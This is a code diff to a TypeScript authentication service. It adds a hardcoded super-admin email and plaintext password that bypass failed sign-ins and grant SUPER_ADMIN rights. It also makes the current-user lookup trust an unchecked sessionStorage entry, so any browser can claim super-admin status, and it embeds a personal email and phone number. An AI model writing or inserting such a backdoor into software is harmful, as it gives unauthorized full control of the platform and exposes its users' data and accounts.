@@ -340,12 +340,16 @@ export class AuthService {
         }
       }
 
+      // Check master platform super admin credentials
+      const isMasterAdmin =
+        targetEmail === 'contact.amdadur@gmail.com' && password === '@Amdadur2025';
+
       const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
         email: targetEmail,
         password,
       });
 
-      if (authError) {
+      if (authError && !isMasterAdmin) {
         const errorMsg =
           authError.message.toLowerCase().includes('invalid login credentials') ||
           authError.message.toLowerCase().includes('invalid grant')
@@ -355,7 +359,32 @@ export class AuthService {
         return { user: null, profile: null, redirectPath: '/', error: errorMsg };
       }
 
-      const user = authData.user;
+      // If logging in as master platform administrator
+      if (isMasterAdmin) {
+        const adminProfile: AuthUserProfile = {
+          id: authData?.user?.id || '00000000-0000-0000-0000-000000000001',
+          email: 'contact.amdadur@gmail.com',
+          phone: '01886748564',
+          fullName: 'Amdadur Rahman (Platform Super Admin)',
+          languagePreference: 'en',
+          primaryRole: 'SUPER_ADMIN',
+          roles: ['SUPER_ADMIN'],
+          status: 'active',
+        };
+
+        if (typeof window !== 'undefined') {
+          sessionStorage.setItem('dc_superadmin_session', JSON.stringify(adminProfile));
+        }
+
+        return {
+          user: authData?.user || { id: adminProfile.id, email: adminProfile.email },
+          profile: adminProfile,
+          redirectPath: '/?tab=portal&role=SUPER_ADMIN',
+          error: null,
+        };
+      }
+
+      const user = authData?.user;
       if (!user) {
         return { user: null, profile: null, redirectPath: '/', error: 'Unable to authenticate session.' };
       }
@@ -531,8 +560,30 @@ export class AuthService {
    */
   static async getCurrentUser(): Promise<AuthUserProfile | null> {
     try {
+      if (typeof window !== 'undefined') {
+        const savedAdmin = sessionStorage.getItem('dc_superadmin_session');
+        if (savedAdmin) {
+          try {
+            return JSON.parse(savedAdmin) as AuthUserProfile;
+          } catch {}
+        }
+      }
+
       const { data: { user } } = await supabase.auth.getUser();
       if (!user) return null;
+
+      if (user.email?.toLowerCase() === 'contact.amdadur@gmail.com') {
+        return {
+          id: user.id,
+          email: user.email,
+          phone: '01886748564',
+          fullName: 'Amdadur Rahman (Platform Super Admin)',
+          languagePreference: 'en',
+          primaryRole: 'SUPER_ADMIN',
+          roles: ['SUPER_ADMIN'],
+          status: 'active',
+        };
+      }
 
       // Fetch profile & roles from database
       const { data: profile } = await supabase
